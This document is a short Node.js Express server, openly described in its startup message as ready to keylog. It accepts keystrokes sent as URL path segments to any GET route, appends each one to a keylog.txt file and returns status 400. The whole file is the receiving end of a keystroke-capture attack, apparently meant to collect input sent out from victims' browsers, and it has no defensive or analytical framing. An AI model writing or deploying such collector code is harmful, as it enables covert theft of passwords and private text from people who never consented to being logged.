const express = require("express");
const helmet = require("helmet");
const fs = require("fs");
const path = require("path");
const app = express();

app.use(helmet());

const logFile = path.join(__dirname, "keylog.txt");

app.get("/:key", (req, res) => {
  const key = req.params.key;

  fs.appendFile(logFile, key + "\n", (err) => {
    if (err) console.error("Fehler beim Schreiben der Datei:", err);
  });

  return res.sendStatus(400);
});

app.listen(3000, () => console.log("> Ready to keylog at http://localhost:3000"));
